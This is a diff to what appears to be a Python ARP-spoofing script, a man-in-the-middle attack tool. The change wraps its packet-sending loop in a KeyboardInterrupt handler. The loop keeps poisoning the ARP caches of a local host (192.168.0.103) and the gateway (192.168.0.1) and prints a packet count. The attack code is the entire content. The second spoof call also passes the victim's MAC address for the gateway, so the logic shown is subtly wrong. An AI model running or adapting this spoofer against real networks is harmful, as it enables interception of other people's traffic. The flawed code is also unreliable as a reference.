@@ -23,11 +23,14 @@ def spoof(target_ip , spoof_ip , target_mac):
 
 target_mac = get_mac("192.168.0.103")  
 sent_packets_count = 0 
-while True:
-    spoof("192.168.0.103", "192.168.0.1" , target_mac)
-    spoof("192.168.0.1", "192.168.0.103" , target_mac)
-    sent_packets_count = sent_packets_count+2
-    print("\r[+] Packets sent : " + str(sent_packets_count)), #Storing the print statement in buffer and then flushing the buffer to print in one line
-    #print("\r [+] Packets sent :" + str(sent_packets_count), end=" ") # This is the syntax to print buffer in python3 , you wont be needing sys.stdout.flush() , this statement does all the work
-    sys.stdout.flush()
-    time.sleep(2)
+try:
+    while True:
+        spoof("192.168.0.103", "192.168.0.1" , target_mac)
+        spoof("192.168.0.1", "192.168.0.103" , target_mac)
+        sent_packets_count = sent_packets_count+2
+        print("\r[+] Packets sent : " + str(sent_packets_count)), #Storing the print statement in buffer and then flushing the buffer to print in one line
+        #print("\r [+] Packets sent :" + str(sent_packets_count), end=" ") # This is the syntax to print buffer in python3 , you wont be needing sys.stdout.flush() , this statement does all the work
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] Detected CTRL+C ...... Quitting")        
